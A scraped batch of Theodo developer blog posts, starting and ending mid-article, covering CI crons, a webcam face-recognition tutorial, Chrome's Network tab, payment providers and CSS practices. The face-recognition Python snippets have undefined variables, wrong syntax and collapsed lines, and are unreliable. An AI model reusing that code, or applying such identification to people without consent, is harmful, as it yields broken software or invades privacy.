outdated or incorrect info, global financial regulators could issue you a huge fine. Therefore, I built a tool to generate requests with randomized parameters (country, user profile\u2026), play them, and check for regressions. The whole process can take an hour. We run it via our CI, daily, at night, and it saved the client a lot of trouble.\nYou can easily set up crons on CircleCi if you\u2019ve already tried Jobs/Workflows. Check out the documentation.\nNote: Crons use the POSIX date-time notation, which can be a bit tricky at first. Check out this neat Crontab Tester tool to get used to it!\n\u00a0\nMisc tips:\n\nLearn Shell! All Continuous Integration / Continuous Delivery systems can run Shell scripts. Don\u2019t be afraid to sparkle some scripts in your build! Add quick checks between/during tasks to make debugging easier, or make your build fail faster: you don\u2019t want to wait for the full 10 minutes when you can check at 2\u201930 that your lockfile is not up-to-date!\nUse cache on your project dependencies!\nAdd extra short task to your CI to connect useful tools like Codecov.io or Danger\n\n\u00a0\nIf you have any other tip you would like to share, don\u2019t hesitate!\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAur\u00e9lien Le Masson\r\n  \t\t\t\r\n  \t\t\t\tDeveloper @ Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHow to recode Big Brother in 15 min on your couch\nFace Recognition Explained\nIn this article, we will step by step implement a smart surveillance system, able to recognise people in a video stream and tell you who they are. \nMore seriously, we\u2019ll see how we can recognise in real-time known faces that appear in front of a camera, by having a database of portraits containing those faces.\nFirst, we\u2019ll start by identifying the different essential features that we\u2019ll need to implement. To do that,\u00a0we\u2019ll analyse the way we would to that, as human beings (to all the robots that are reading those words, I hope I don\u2019t hurt your feelings too much and I truly apologize for the methodology of this article).\nAsk yourself : if someone passes just in front of you, how would you recognise him ?\n\nYou\u2019ll need first to see the person\nYou then need to focus on the face itself\nThen there are actually two possibilities.\n\nEither I know this individual and I can recognise him by comparing his face with every face I know.\nOr I don\u2019t know him\n\n\n\nLet\u2019s see now how to the algo will do those different steps.\nFirst step of the process : seeing the person\nThis is quite a simple step. We\u2019ll simply need a computer and a webcam, to capture the video stream. \nWe\u2019ll use openCV Python. With a few lines of code, we\u2019ll be able to capture the video stream, and dispose of the frame one by one.\nimport cv2\r\n\r\nvideo_capture = cv2.VideoCapture(0)\r\n\r\nwhile True:\r\n   # Capture frame-by-frame\r\n   frame = video_capture.read()\r\n\r\n   # Display the resulting frame\r\n   cv2.imshow('Video', frame)\r\n\r\n   if cv2.waitKey(1) & 0xFF == ord('q'):\r\n       break\r\n\r\n# When everything is done, release the capture\r\nvideo_capture.release()\r\ncv2.destroyAllWindows()\r\n\r\n\nHow to detect a face in a picture ?\nTo be able to find a face in the picture, let\u2019s ask ourselves, what is a face and how can we discriminate a face from Gmail\u2019s logo for example ?\n\n\nWe actually do it all the time without even thinking about it. But how can we know that easily that all these pictures are faces ?\n\nWhen we look at those different pictures, photographs and drawings, we see that a face is actually made of certain common elements : \n\nA nose\nTwo eyes\nA mouth \nEars\n\u2026\n\nBut not only are the presence of these elements essential, but their positions is also paramount. \nIndeed, in the two pictures here, you\u2019ll find all the elements that you\u2019ll find in a face. Except one is a face, and one is not.\n\nSo, now that we\u2019ve seen that a face is characterised by certain criterias, we\u2019ll turn them into simple yes-no questions, which will be very useful to find a face in a square image.\nAs a matter of fact, the question \u201cIs there a face in a picture ?\u201d is very complex. However, we\u2019ll be able to approximate it quite well by asking one after the other a series of simple question : \u201cis there a nose ?\u201d ; \u201cIs there an eye ? If yes, is their two eyes ?\u201d ; \u201cAre there ears ?\u201d ; \u201cIs there some form of symmetry ?\u201d. \nAll these questions are both far more simple than the complex question \u201cIs there a face in the picture ?\u201d, while providing us with information to know if part of the image is or is not a face. \nFor each one of these questions, a no answer is very strong and will tell us that there is definitely no face in the picture. \nOn the contrary, a yes answer will not allow us to be sure that there is a human face, but it will slightly increase the probability of the presence of a face.\u00a0If the image is not a face, but it is tree, the answer to the first question \u201cis there a nose ?\u201d will certainly be negative. No need then to ask if there are eyes, or if there is some form of symmetry.\nHowever, if indeed there is a nose, we can go forward and ask \u201care there ears?\u201d. If the answer is still yes, this won\u2019t mean that there is a face, but will slightly increase the likeliness of this possibility, and we will keep digging until being sufficiently confident to say that there is a face indeed.\nThe interest is that the simplicity of the questions will reduce drastically the cost of face detection, and allow to do real-time face detection on a video stream. \nThis is the principle of a detection method called \u201cthe cascade of weak classifier\u201d. Every classifier is very weak considering that it gives only a very little degree of certitude. But if we do the checks one by one, and a region of the picture has them all, we\u2019ll be at the end almost sure that a face is present here. \nThat\u2019s why it is called a cascade classifier, because like a series of waterfalls, the algorithm will simply do a very simple and quick check, one by one, and will only move forward with another check if the first one is positive. \nTo do face detection on the whole picture, and considering that we don\u2019t know in advance the size of the face, we\u2019ll simply apply the cascade algorithm on a moving window for every frame.\n\nWhat we\u2019ve explained here is the principle of the algorithm. Lots of research has been made about how to use cascade for object detection. OpenCV has a built-in way to do face detection with a cascade classifier, by using a set of 6,000 weak classifiers especially developed to do face detection.\nimport cv2\r\n\r\nopencv_path = 'm33/lib/python3.7/site-packages/cv2/data/'\r\nface_cascade = cv2.CascadeClassifier(opencv_path + 'haarcascade_frontalface_default.xml')\r\n\r\nvideo_capture = cv2.VideoCapture(0)\r\n\r\nwhile True:\r\n    # Capture frame-by-frame\r\n    ret, frame = video_capture.read()\r\n\r\n    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\r\n\r\n    faces = face_cascade.detectMultiScale(gray, scaleFactor=1.3, minNeighbors=5)\r\n \r\n    # Draw a rectangle around the faces\r\n    for (x, y, w, h) in faces:\r\n        cv2.rectangle(frame, (x, y), (x+w, y+h), (0, 255, 0), 2)\r\n\r\n    # Display the resulting frame\r\n    cv2.imshow('Video', frame)\r\n\r\n    if cv2.waitKey(1) & 0xFF == ord('q'):\r\n        break\r\n\r\n# When everything is done, release the capture\r\nvideo_capture.release()\r\ncv2.destroyAllWindows()\r\n\nNow that we can detect the face, we need to recognise it among other known faces. Here is what we got :\u00a0\nFace recognition\nNow that we have a system able to detect a face, we need to make sense out of it and recognise the face.\nBy applying the same methodology as before, we\u2019ll find the criterias to recognise a face among others.\nTo do that, let\u2019s look at how we differentiate between two faces : Harry Potter on one side, and Aragorn on the second.\n\nLet\u2019s make a list of the things that can differentiate them : \n\nForm of their nose\nForm of their eyes\nTheir hair\nColor of their eyes\nDistance between the eyes\nSkin color\nBeard\nHeight of the face\nWidth of the face\nRatio of height to width\n\nOf course, this list is not exhaustive. However, are all those criterias good for face recognition ? \nSkin color is a bad one for example. We\u2019ve all seen Harry Potter or Aragorn after hard battles covered with dirt or mud, and we\u2019re still able to recognise them easily.\nSame goes for height and width of the face. Indeed, these measures change a lot with the distance of the person to the camera. Despite that we can easily recognise the faces even when their size changes. \nSo we can keep some good criterias that will really help recognise a face : \n\nForm of their nose\nForm of their eyes\nDistance between the eyes\nRatio of height to width \nPosition of the nose relative to the whole face\nForm of eyebrows\n\u2026\n\nLet\u2019s now measure all these elements. By doing this, we\u2019ll have a set of values that describe the face of an individual. These measures are a discrete description of what the face looks like.\n\nActually, what we have done, is that we reduced the face to a limited number of \u201cfeatures\u201d that will give us valuable and comparable information of the given face.\n\nMathematically speaking, we have simply created a vector space projection, that allowed us to reduce the number of dimensions in our problem. From a million-dimensions vector space problems (if the picture is 1MPixel RGB image, the vector space is of 1M * 3 dimensions) to a an approximately a-hundred-dimension vector space. The problem becomes far more simple ! \nNo need to consider all the pixels in the picture at all, we only need to extract from the image a limited set of features. These extracted features can be considered as vectors that we can then compare the way we do it with any vector by computing euclidean distances for example.\n\nAnd just like that, comparing faces becomes mathematically as simple as computing the distance between two points on a grid, with only a few more dimensions ! To be simple, it\u2019s as though, every portrait can then be described as a point in space. The closer points are, the more likely they describe the same face ! And that\u2019s all !\nWhen we find a face in a frame, we find its position in the feature-space and we look for the nearer known point. If the distance between the two is close, we\u2019ll consider that they\u2019re both linked to the same face. Otherwise, if the point representing the new face is too far from all the faces known, it means we don\u2019t know this face.\n\nTo implement that, we\u2019ll use the face_recognition Python library that allows us to use a deep learning algorithm that extracts from a face a 128-dimension vector of features. \nWe\u2019ll do it in two steps.\nWe first turn our portrait database into a set of computed feature-vectors (reference points like the Frodo point in the example above). \nimport face_recognition\r\nimport os\r\nimport pandas as pd\r\n\r\ndef load_image_file(file):\r\n    im = PIL.Image.open(file)\r\n    im = im.convert('RGB')\r\n    return np.array(im)\r\n\r\nface_features = []\r\nnames = []\r\n\r\nfor counter, name in enumerate(os.listdir('photos/')):\r\n   if '.jpg' not in name:\r\n       continue\r\n   image = load_image_file(pictures_dir + name)\r\n   try:\r\n       face_features.append(face_recognition.face_encodings(image)[0])\r\n       names.append(name.replace('.jpg', ''))\r\n   except IndexError:\r\n\t// happens when no face is detected\r\n       Continue\r\n\r\nfeatures_df = pd.DataFrame(face_features, names)\r\nfeatures_df.to_csv('database.csv')\r\n\r\n\nThen, we load the database and launch the real-time face recognition:\nimport cv2\r\nimport pandas as pd\r\nfrom helpers import load_database\r\nimport PIL\r\nimport numpy as np\r\nimport face_recognition\r\n\r\ndef load_image_file(file):\r\n    im = PIL.Image.open(file)\r\n    im = im.convert('RGB')\r\n    return np.array(im)\r\n\r\nface_features = []\r\nnames = []\r\n\r\nfor counter, name in enumerate(os.listdir('photos/')):\r\n   if '.jpg' not in name:\r\n       continue\r\n   image = load_image_file(pictures_dir + name)\r\n   try:\r\n       face_features.append(face_recognition.face_encodings(image)[0])\r\n       names.append(name.replace('.jpg', ''))\r\n   except IndexError:\r\n       # happens when no face is detected\r\n       Continue\r\n\r\nface_cascade= cv2.CascadeClassifier('m33/lib/python3.7/site-packages/cv2/data/haarcascade_frontalface_default.xml')\r\n\r\nvideo_capture = cv2.VideoCapture(0)\r\n\r\nwhile True:\r\n   # Capture frame-by-frame\r\n   ret, frame = video_capture.read()\r\n   gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\r\n   faces = face_cascade.detectMultiScale(gray, scaleFactor=1.3, minNeighbors=5)\r\n  \r\n   # Draw a rectangle around the faces\r\n   for (x, y, w, h) in faces:\r\n       cv2.rectangle(frame, (x, y), (x+w, y+h), (0, 255, 0), 2)\r\n\r\n       pil_im = PIL.Image.fromarray(frame[y:y+h, x:x+w])\r\n       face = np.array(pil_im.convert('RGB'))\r\n       try:\r\n           face_descriptor = face_recognition.face_encodings(face)[0]\r\n       except Exception:\r\n           continue\r\n       distances = np.linalg.norm(face_descriptors - face_descriptor, axis=1)\r\n       if(np.min(distances) < 0.7): found_name = names[np.argmin(distances)] print(found_name) print(found_name) #y = top - 15 if top - 15 > 15 else top + 15\r\n       cv2.putText(frame, found_name, (y, y-15), cv2.FONT_HERSHEY_SIMPLEX,\r\n                   0.75, (0, 255, 0), 2)\r\n\r\n   # Display the resulting frame\r\n   cv2.imshow('Video', frame)\r\n\r\n   if cv2.waitKey(1) & 0xFF == ord('q'):\r\n       break\r\n\r\n# When everything is done, release the capture\r\nvideo_capture.release()\r\ncv2.destroyAllWindows()\r\n\r\n\nAnd here it comes ! \n\nHere is a github repo with the code working : https://github.com/oussj/big_brother_for_dummies\nExternal links I used : \n\nhttps://github.com/ageitgey/face_recognition\nhttps://medium.com/@ageitgey/machine-learning-is-fun-part-4-modern-face-recognition-with-deep-learning-c3cffc121d78\nhttps://realpython.com/face-recognition-with-python/\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tOussamah Jaber\r\n  \t\t\t\r\n  \t\t\t\tAfter graduating from MINES ParisTech, I joined Theodo as an agile web developer to use cutting-edge technology and build awesome products !  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen I started web development, the developer tools were so new to me I thought I would save time not using them in the first place. I quickly realized how wrong I was as I started using them. No more console.log required, debugging became a piece of cake in a lot of cases!\nThe Network tab is used to track all the interactions between your front end and your back end, thus the network.\nIn this article, I will show usages of the developer tools Network tab on Google Chrome web browser.\nLet\u2019s start exploring the network tab!\nRecord the network logs\nThe first thing to do is to record the network logs by making sure the record button is activated before going on the page you want to record: \n\nCheck the response of a request sent to your server\nYou can keep only the requests sent to your server by clicking on the filter icon and then selecting \u201cXHR\u201d:\n\nIn that section, you can see some information about your requests:\n\nHTTP status code\nType of request\nSize of the request\nEtc.\n\nTo get more details about a request, you can simply click on it.\nLet\u2019s look at the my-shortcuts endpoint that retrieves the shortcuts of an user connected on the application I am using. You can look at the formatted response by clicking on the \u201cPreview\u201d tab: \n\nIf the response of an XHR is an image, you will be able to preview the image instead.\nOn this tab, it becomes easy to determine if the format of the response corresponds to what your front end expected.\nGreat! Now you know how to check the response of a request sent to your server without writing any console.log in your code!\nTest your requests with various Internet connection speeds\nIf the users of the application you are developing have a lower Internet speed than yours, it can be interesting to test your application with custom Internet speed.\nIt is possible to do so by using bandwidth throttling by clicking on the following dropdown menu: \u00a0\n\n\nReplay a request\nReplaying a request can be useful if you want to see how the front end interacts with the response of a request again or if you need to test your request with different parameters. It can be long and painful to reload the page and reproduce exactly the same actions over and over again. Here are some better ways to replay a request:\n\n When right-clicking on a request, you can copy the cURL format of your request and paste it in the terminal of your computer to send the request to your back end:\n\n\n\n When right-clicking on a request, you can copy the request headers and paste them in your favorite API development environment (e.g. Postman):\n\n\nIn Postman, click on \u201cHeaders tab\u201d > \u201cBulk Edit\u201d to edit the headers:\n\nNow all you need to do is paste your headers. Don\u2019t forget to comment the path of the request which is not a header: \u00a0\n\n\n\n If you are using \u201cXHR\u201d requests, you can simply right-click on the request you want to replay and click on \u201cReplay XHR: \n\n\nI hope that I could help you debug your network interactions with this article!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJordan Lao\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen\u00a0deciding what external payment service you want to use, you need to take into account several factors: the price of the payment provider, the amount of time of implementation, the ease of customising and styling the form, the trust of users to the company \u2026 and see what is best suited for your needs. There is not one best online provider, but this article will\u00a0help you chose one that fits you project.\nAt Theodo we use different online payment providers: SagePay, PayPal and Stripe for\u00a0our websites. For each one of them we have discovered advantages and drawbacks, that I will share with you.\nKeep in mind that using a payment provider such as one we are going to talk about allows to easily be PCI\u00a0compliant, which is\u00a0essential for any website dealing with card data.\nOverall price\nThe overall price covers the development cost and the\u00a0transaction fees. Additional costs for setup, refunding and breaking the contract may also apply.\nDevelopment cost:\nHere is\u00a0in order a comparison of the three payment providers\u00a0we use:\n\n1 \u2013 Stripe: ~1day. This \u201cdevelopment first\u201d payment provider is specially built for an easy integration to websites. Therefore it is no surprise that\u00a0it is a good choice if you want to quickly\u00a0handle payments. In our company we like to use it\u00a0when building MVPs because it takes less than a day to integrate and design with\u00a0Stripe Elements.\n2 -PayPal express checkout: ~ 2/3 days. You can usePayPal Express Checkout on your website to allow your customers to proceed to aPayPal payment. This will momentarily redirect the client to the PayPal login page and then a summary page where he can pay he will then be sent back to your website. Integrating Paypal takes a couple of days.\n3 \u2013 SagePay: ~ 1 week. Out of the three payment providers we use, this is definitely the one that takes the longest to integrate \u2013 all in all more than a week. You can use an iFrame to send the card data. However the documentation is not that clear and styling the form is complex (you need to send the styling files to SagePay that will then add them to the iFrame).\n\nFees per transaction:\nThe price depends on:\n\nNumber of transaction per month\nPrice per transaction you will charge\nDebit or Credit card\n\u2026\n\nFrom\u00a0our experience we found that\u00a0for websites selling lots of products\u00a0at\u00a0small prices (~10\u20ac) it is worth using SagePay. But if\u00a0there is\u00a0a smaller traffic and higher prices Stripe might be a better solution. In both casesPayPal tends to have higher fees.\nFinally, companies often negotiate the price fees directly with the payment providers to get more interesting offers, but this can\u00a0take some time.\nHere is an example of what you would be paying\u00a0to the different companies:\nIf your company sells 100 products a month at an average price of \u00a340 (total of \u00a34,000), these would be the prices:\n\nStripe: \u00a381\nSagePay: \u00a3103.5\nPayPal: \u00a3136\n\nBut if your company sells 350 products a month at an average price of \u00a310 (total of \u00a33,500), these would be the prices:\n\nStripe: \u00a3136.5\nSagePay: \u00a393.05\nPayPal: \u00a3171\n\nHere are the fees that you can find on the 3 websites:\n\nStripe:\n\nFor VISA Mastercard and American Express:\n\n1.4% + 25p / transaction for European cards\n2.9% + 25p / transaction for non European cards\n\n\nAs they say on their website: \u2019No setup, monthly, or hidden fees\u2019.\nOver \u00a320,000 per months you can negotiate for lower fees\nhttps://stripe.com/gb/pricing\n\n\nSagePay:\n\n\u00a319.90/month: 350 free transactions per month then 12p per transaction after\n\u00a345/month if max 500 free token purchases per month then 10p per transaction\nIf more than 3000 transactions per month you will need to contact Sagepey to get a corporate account\n+ 2.09% for Mastercard or Visa credit cards + 40p for debit cards (fees a quite hidden)\nCancelation fees can be high, a minimum of 3 months notice is necessary.\nhttps://www.sagepay.co.uk/our-payment-solutions/online-payments\n\n\nPayPal:\n\nLess than \u00a31500/month:\u00a03.4%\u00a0+ 20p per transaction\nLess than \u00a36000/month:\u00a02.9%\u00a0+ 20p per transaction\nLess than \u00a315,000/month:\u00a02.4%\u00a0+ 20p per transaction\nLess than \u00a355,000/month:\u00a01.9%\u00a0+ 20p per transaction\nMore: personalised amount\nhttps://www.paypal.com/uk/webapps/mpp/paypal-fees\n\n\n\nWebsite Integration / design\nThe design of the form is very important. Users probably will not trust a website with cheap design. Also, paying is not the most pleasant moment of a customer\u2019s journey. A seamless flow\u00a0should be a must-have\u00a0to\u00a0get customers to pay and come back. Do not underestimate the design of your form!\n\nStripe: you can easily style the different inputs so the payment is consistent with the rest of your website. This is something we really appreciate with Stripe Elements.\nPayPal: as the payment is done directly onPayPal website you won\u2019t have any design to do! Users would find this option reassuring because they know how there money is being processed.\nSagePay: it is difficult to get a flawless and consistent design, as you have to send files to SagePay so they can handle the iFrame styling.\n\nWhat we recommend\nIf you wish to add a payment method to your website for the first time and that the project is short, we would recommend Stripe. As it is really easy to integrate and style it is perfect for these projects. If your website has a lot of traffic, SagePay is a good choice because of its low fees with a lot of transactions. However keep in mind that the implementation can take time.\u00a0Finally it is a nice option to add aPayPal button on top of your existing payment methods as some customers are reluctant to input the card details on websites.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlice Breton\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThrough my experiences, I encountered many fellow coworkers that found CSS code painful to write, edit and maintain. For some people, writing CSS is a chore. One of the reasons for that may be that they have never been properly taught how to write good CSS in the first place, nor what is good CSS. Thus it has an impact on their efficiency and on the code quality, which isn\u2019t what we want. This two parts article will focus on:\n\nPart 1: What is good CSS code? (more precisely, what is not good CSS). I will focus on actionable tips and tricks to avoid creating technical debt starting now.\nPart 2: how to migrate from a complex legacy stylesheet to a clean one.\n\nWarning: these are the guidelines that I gathered through my experiences and that worked well for many projects I worked on. In the end, adopt the methods that fit your needs.\nRequirements\nI assume that you are looking for advice to improve yourself at writing CSS, thus you have a basic knowledge of CSS and how it works. In addition, you will need these things:\nA definition of done\nYou should be very clear about which browser/devices you want to support or not. You must list browsers/devices you want to support and stick to it. Here is an example of what can be a definition of done:\n\nBrowsers: Chrome \u2265 63, Firefox \u2265 57, Edge \u2265 12\nDevices: laptops with resolution \u2265 1366*768\n\nYou must write this list with a business vision: maybe your business needs IE support because 20% of your users are using it. You can be specific for some features. For instance: the landing page should work on devices with small screens but the app behind the login should not.\nBut if your Definition Of Done does not include IE9, do not spend unnecessary time fixing exotic IE9 bugs. From there you can use caniuse.com to see which CSS features are supported on your target browsers (example below).\n\nA good understanding of what specificity is\nHere is a quick reminder about what is specificity:\nSpecificity determines which CSS rule is applied by the browsers. If two selectors apply to the same element, the one with higher specificity wins.\nThe rules to win the specificity wars are:\n\nInline style beats ID selectors. ID selectors are more specific than classes and attributes (::hover,\u00a0::before\u2026). Classes win over element selectors.\nA more specific selector beats any number of less specific selectors. For instance,\u00a0.list\u00a0is more specific than\u00a0div ul li.\nIncreasing the number of selectors will result in higher specificity. .list.link\u00a0is more specific than\u00a0.list and .link.\nIf two selectors have the same specificity, the last rule read by the browser wins.\nAlthough !important\u00a0has nothing to do with the specificity of a selector, it is good to know that a declaration using !important overrides any normal declaration. When two conflicting declarations have the !important keyword, the declaration with a greater specificity wins.\n\nHere is a good website to compute the specificity of a selector:\u00a0Specificity Calculator. Below is a chart to recap all these rules (taken from this funny post on specificity).\n\nSome basic knowledge of preprocessors\nPreprocessors are great because they allow you to write CSS faster. They also help to make the code more understandable and customizable by using variables. Here I will use a SCSS syntax in the examples (my favorite preprocessor but others like LESS/Stylus are pretty similar). An example of what you can do with preprocessors:\n// vars.scss\r\n$messageColor: #333;\r\n\r\n// message.scss\r\n@import 'vars';\r\n%message-shared {\r\n    border: 1px solid black;\r\n    padding: 10px;\r\n    color: $messageColor;\r\n}\r\n\r\n.message {\r\n    @extend %message-shared;\r\n}\r\n.success {\r\n    @extend %message-shared;\r\n    border-color: green;\r\n}\r\n\nVariables in CSS can now be done with native CSS but preprocessors still have the upper hand on readability/usability.\nWhat you should not do\nI will show you what you DON\u2019T want to do and explain why such coding practices will lead to many problems over time.\nDon\u2019t write undocumented CSS\nI put this point first because I believe it\u2019s one of the most impactful things you can act on straightaway. Like any other language, CSS needs to be commented. Most stylesheets don\u2019t have comments. And when I advise you to write comments, I don\u2019t talk about this:\n// Header style\r\n.header {}\r\n\nThose are bad comments because they have no purpose and convey no additional information. A good CSS comment explains the intention behind a selector/rule. Here is an example of some good comments:\n.suggestions {\r\n    // 1 should be enough but in fact there is a Bootstrap rule that says\r\n    // .btn-group>.btn:hover z-index: 2 (don't ask me why they did this)\r\n    z-index: 3;\r\n}\r\n\r\n// Firefox doesn't respect some CSS3 specs on the box model rules\r\n// regarding height. This is the only cross-brower way to do an \r\n// overflowing-y child in a fixed height container.\r\n// See https://blogs.msdn.microsoft.com/kurlak/2015/02/20/filling-the-remaining-height-of-a-container-while-handling-overflow-in-css-ie8-firefox-chrome-safari/\r\n.fixed-height-container {}\r\n\nWhat should you comment on?\n\nCSS hacks\nEvery line you didn\u2019t write or you wrote 6 months ago (which is the same) where you needed more than 10 seconds to understand its intended purpose.\nMagic values. Speaking of which\u2026\n\nDon\u2019t use magic values\nThe most common thing between developers resenting CSS is a general feeling of black magic. Put a rule here and an !important there, with a width value that looks good and it works. You see? Magic. But magic doesn\u2019t exist. You should have a more scientific approach to demystify CSS. Writing good comments is one thing. Stopping writing magic values is another.\nI define a magic value by \u201cany value that looks weird, aka is not a multiple of 5\u201d \u2013 even then some values may look weird. Examples of magic values are:\nleft: 157px;\r\nheight: 328px;\r\nz-index: 1501;\r\nfont-size: 0.785895rem;\r\n\nWhy are these values problematic? Because again, they do not convey the intention. What is better:\n\nUsing preprocessor variables which adds a meaning to a number.\nMake the exact calculation. If you wrote this value after some tests using the Chrome dev tools you may find out with a scientific approach that your initial \u201cmagic\u201d value may not be the most accurate one.\nCommenting the value to explain why it\u2019s here.\nChallenging your value/unit and changing it to a more pertinent one.\n\nExample:\nleft: calc(50% - ($width / 2));\r\n// An item have a 41px height:\r\n// 2*10px from padding+20px from line-height+1px from one border.\r\n// So to get 8 items in height:\r\nheight: 8 * 41px;\r\nz-index: 1501; // Needs to be above .navbar\r\nfont-size: 0.75rem;\r\n\nDon\u2019t use px units everywhere\nMost hellish CSS stylesheets use px units everywhere. In fact, you should almost never use them. In most cases, pixels never is the good unit to use. Why? Because they don\u2019t scale with the font-size or the device resolution. Here is a recap of which unit to use depending on the context. Quick cheat sheet:\n\npx: do not scale. Use for borders and the base font size on the html element. That\u2019s all.\nem, rem (> IE8): scale with the font-size. 1.5em is 150% of the font size of the current element. 0.75rem is 75% of the font size of the html element. Use rem for typography and everything vertical like margins and paddings. Use em wisely for elements relative to the font-size (icons as a font for instance) and use it for media query breakpoints.\n%, vh, vw (> IE8): scale with the resolution. vh and vw are percentages of the viewport height and width. These units are perfect for layouts or in a calc to compute the remaining space available (min-height: calc(100vh - #{$appBarHeight})).\n\nI made a page for you to play with the base font-size and CSS units (open in a new window to resize the viewport and try changing the zoom setting).\nDon\u2019t use !important\nYou should keep your specificity as low as possible. Otherwise, you will be overriding your override rules. If you tend to override your styles, with time passing you will hit the hard ceiling \u2013 !important and inline style. Then it will be a nightmare to create more specific CSS rules.\nUsing !important is a sign that you\u2019re working against yourself. Instead, you should understand why you have to do this. Maybe refactoring the impacted class will help you, or decoupling the common CSS in another class would allow you not to use it and lower your specificity.\nThe only times you should use it is when there is absolutely no other way to be more specific than an external library you are using.\nDon\u2019t use IDs as selectors\nKeep. Your. Specificity. Low. Using an ID instead of a class condemn you to not reuse the code you\u2019re writing right now. Furthermore, if your javascript code is using IDs as hooks it could lead to dead code (you are not certain whether you can remove this ID because it could be used by the JS and/or CSS).\nInstead of using IDs, try to look up common visual patterns you could factorize for future reuse. If you need to be specific, add a class on the lowest level of the DOM tree possible. At the very least, use a class with the name you would have given to your ID.\n// Don't\r\n#app-navbar {}\r\n\r\n// Slighlty better\r\n.app-navbar {}\r\n\r\n// Better (pattern that you could reuse)\r\n.horizontal-nav {}\r\n\nDon\u2019t use HTML elements as selectors\nAgain. Keep your specificity low. Using HTML tags as selectors goes against this because you will have to add higher-specificity selectors to overwrite them later on. For instance, styling the a element (especially the a element, with all its use cases and different states) will be an inconvenience when you use it in other contexts.\n// Don't\r\n<a>Link</a>\r\n<a class=\"button\">Call to action</a>\r\n<nav class=\"navbar\"><a>Navbar link</a></nav>\r\na { ... }\r\n.button { ... }\r\n// Because you will have to create more specific selectors\r\na.button { ...overrides that have nothing to do with the button style... }\r\n.navbar a { ...same... }\r\n\r\n// Better\r\n<a class=\"link\">Link</a>\r\n<a class=\"button\">Call to action</a>\r\n<nav class=\"navbar\"><a class=\"navbar-link\">Navbar link</a></nav>\r\n.link { ...style of a link, can be used anywhere... }\r\n.button { ...style of a button, idem... }\r\n.navbar-link { ...style of a navbar link, used only in navbars... }\r\n\nHowever, there are some cases when you could use them, for instance when a user wrote something like a blog post that is output in pure HTML format (therefore preventing you from adding custom classes).\n// Don't\r\nul { ... }\r\n\r\n// Better\r\n%textList { ... }\r\n.list { @extends %textList; }\r\n.user-article {\r\n    ul { @extends %textList; }\r\n}\r\n\nFurthermore, HTML should be semantic and the only hooks for style should be the classes. Don\u2019t be tempted to use an HTML tag because it has some style attached to it.\nA side-note on the ideal specificity\nYou should aim for a specificity of only one class for your CSS selectors.\nThe best part in Cascading Style Sheets is \u201ccascading\u201d. The worst part in Cascading Style Sheets is \u201ccascading\u201d \u2014 The Internet\nThe whole thing about CSS is that you want to make your style the same everywhere (therefore it needs to be reusable) AND you want to make it different in some unique places (therefore it needs to be specific). All CSS structure issues are variations of this basic contradiction.\nOpinion: The Cascading effect of CSS can be a great tool and it serves a purpose: to determine which CSS declaration is applied when there is a conflict. But it is not the best tool to solve this problem. What if instead, there were no conflicts on CSS declarations, ever? We wouldn\u2019t need the Cascade effect and everything would be reusable. Even \u201csuper-specific\u201d code can be written as a class that will be used only once. If you use selectors of only one class, you will never need to worry about specificity and overwriting styles between components.\n\u201cBut that could lead to a lot of duplicated source code\u201d, you could say. And you would be right if there were no CSS preprocessors. With preprocessors, defining mixins to reuse bits of CSS by composition is a great way to factor your code without using more specific selectors.\nThere is still a concern over performance because the output stylesheet is bigger. But for most stylesheets/projects, CSS performance is irrelevant over javascript concerns. Furthermore, the advantage of maintainability far outweighs the performance gains.\nIf we try to combine the last three Don\u2019ts, this is how I would take this code:\n<main id=\"main_page\">\r\n    <p><a>Some link</a></p>\r\n    <footer>\r\n        <a>Some other link</a>\r\n    </footer>\r\n</main>\r\n\r\na {\r\n    cursor: pointer;\r\n}\r\n\r\n#main_page {\r\n    a {\r\n        color: blue;\r\n\r\n        &:hover {\r\n            color: black;\r\n        }\r\n    }\r\n}\r\n\r\nfooter {\r\n    border: 1px solid black;\r\n\r\n    a {\r\n        color: grey !important;\r\n    }\r\n}\r\n\nAnd turn it into this:\n<main>\r\n    <p><a class=\"link\">Some link</a></p>\r\n    <footer class=\"footer\">\r\n        <a class=\"footer-link\">Some other link</a>\r\n    